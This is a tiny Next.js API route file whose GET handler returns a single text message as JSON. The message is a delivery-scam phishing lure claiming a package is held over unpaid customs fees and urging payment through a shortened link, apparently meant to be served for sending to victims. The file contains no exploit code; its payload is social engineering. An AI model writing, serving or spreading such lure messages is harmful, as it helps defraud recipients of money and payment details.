import { NextResponse } from 'next/server'

export async function GET() {

  return NextResponse.json({text: "Great news, Your package cannot be delivered due to unpaid customs fees, please confirm your payment to avoid delays:https://u.to/xjXZHw"})
}